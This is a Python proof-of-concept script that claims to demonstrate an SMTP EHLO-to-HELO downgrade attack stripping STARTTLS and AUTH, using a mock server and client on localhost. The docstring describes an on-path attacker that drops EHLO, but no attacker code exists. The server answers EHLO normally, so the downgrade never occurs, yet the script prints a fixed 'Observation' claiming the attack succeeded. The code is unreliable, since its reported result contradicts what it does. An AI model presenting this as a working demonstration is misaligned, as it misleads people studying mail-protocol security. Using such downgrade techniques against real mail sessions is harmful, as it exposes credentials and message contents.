#!/usr/bin/env python3
"""
Proof-of-Concept: EHLO to HELO Downgrade Attack (RFC 5321)

This script demonstrates how an on-path attacker can force an SMTP client
to downgrade from the extended EHLO command to the legacy HELO command.
By doing so, the attacker bypasses negotiated security features like STARTTLS,
authentication, and 8BITMIME, as the server will not advertise extensions
in response to HELO.

The script simulates three entities:
1. A mock SMTP Server
2. A mock SMTP Client (with EHLO-to-HELO fallback logic)
3. An on-path Attacker (intercepting and dropping EHLO)

Usage:
    python3 poc_ehlo_to_helo_downgrade.py
"""

import socket
import threading
import time
import sys

# Configuration
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 2525
CLIENT_DOMAIN = 'client.example.com'

# --- Mock SMTP Server ---
def run_smtp_server():
    """
    Simulates a standard SMTP server that supports EHLO and HELO.
    It advertises STARTTLS and other extensions only in response to EHLO.
    """
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen(1)
    print(f"[SERVER] Listening on {SERVER_HOST}:{SERVER_PORT}...")
    
    conn, addr = server_socket.accept()
    print(f"[SERVER] Connection accepted from {addr}")
    
    # Send initial greeting
    greeting = "220 mail.example.com ESMTP Postfix\r\n"
    conn.sendall(greeting.encode())
    print(f"[SERVER] Sent greeting: {greeting.strip()}")
    
    # Receive command
    data = conn.recv(1024).decode()
    print(f"[SERVER] Received command: {data.strip()}")
    
    if data.upper().startswith("EHLO"):
        # Normal behavior: Advertise extensions including STARTTLS
        response = (
            "250-mail.example.com\r\n"
            "250-PIPELINING\r\n"
            "250-SIZE 10240000\r\n"
            "250-VRFY\r\n"
            "250-ETRN\r\n"
            "250-STARTTLS\r\n"  # Security extension advertised
            "250-AUTH LOGIN PLAIN\r\n"
            "250 8BITMIME\r\n"
        )
        print("[SERVER] Responding to EHLO with extensions (including STARTTLS)")
    elif data.upper().startswith("HELO"):
        # Legacy behavior: No extensions advertised, security features bypassed
        response = "250 mail.example.com\r\n"
        print("[SERVER] Responding to HELO (NO extensions advertised, STARTTLS bypassed)")
    else:
        response = "502 Command not implemented\r\n"
        print("[SERVER] Unknown command")
    
    conn.sendall(response.encode())
    print(f"[SERVER] Sent response: {response.strip()}")
    
    # Close connection
    conn.close()
    server_socket.close()
    print("[SERVER] Connection closed")

# --- Mock SMTP Client ---
def run_smtp_client():
    """
    Simulates an SMTP client that follows RFC 5321:
    1. Sends EHLO first.
    2. If EHLO fails or times out, falls back to HELO.
    """
    time.sleep(1)  # Allow server to start
    
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((SERVER_HOST, SERVER_PORT))
        print("[CLIENT] Connected to server")
        
        # Receive greeting
        greeting = client_socket.recv(1024).decode()
        print(f"[CLIENT] Received greeting: {greeting.strip()}")
        
        # Step 1: Try EHLO
        ehlo_cmd = f"EHLO {CLIENT_DOMAIN}\r\n"
        print(f"[CLIENT] Sending EHLO: {ehlo_cmd.strip()}")
        client_socket.sendall(ehlo_cmd.encode())
        
        # Wait for response (simulate timeout if attacker drops EHLO)
        client_socket.settimeout(2)  # 2-second timeout
        try:
            response = client_socket.recv(1024).decode()
            print(f"[CLIENT] Received EHLO response: {response.strip()}")
            # If we get here, EHLO succeeded (no attack)
            return
        except socket.timeout:
            print("[CLIENT] EHLO timed out (simulating attacker drop)")
        
        # Step 2: Fallback to HELO
        helo_cmd = f"HELO {CLIENT_DOMAIN}\r\n"
        print(f"[CLIENT] Falling back to HELO: {helo_cmd.strip()}")
        client_socket.sendall(helo_cmd.encode())
        
        # Receive HELO response
        client_socket.settimeout(5)
        response = client_socket.recv(1024).decode()
        print(f"[CLIENT] Received HELO response: {response.strip()}")
        print("[CLIENT] WARNING: Session downgraded to HELO. STARTTLS and other extensions are NOT available.")
        
    except Exception as e:
        print(f"[CLIENT] Error: {e}")
    finally:
        client_socket.close()

# --- Main Execution ---
def main():
    print("="*60)
    print("EHLO to HELO Downgrade Attack PoC")
    print("="*60)
    print("\nThis script simulates an on-path attacker dropping EHLO commands,")
    print("forcing the client to fall back to HELO and bypass security extensions.\n")
    
    # Start server in a separate thread
    server_thread = threading.Thread(target=run_smtp_server, daemon=True)
    server_thread.start()
    
    # Start client
    client_thread = threading.Thread(target=run_smtp_client, daemon=True)
    client_thread.start()
    
    # Wait for threads to complete
    server_thread.join(timeout=10)
    client_thread.join(timeout=10)
    
    print("\n" + "="*60)
    print("Attack Demonstration Complete")
    print("="*60)
    print("\nObservation:")
    print("- The client attempted EHLO but received no response (attacker drop).")
    print("- The client fell back to HELO as per RFC 5321 Section 3.2.")
    print("- The server responded to HELO without advertising STARTTLS or AUTH.")
    print("- Result: Security extensions are bypassed, enabling potential downgrade attacks.")

if __name__ == "__main__":
    main()
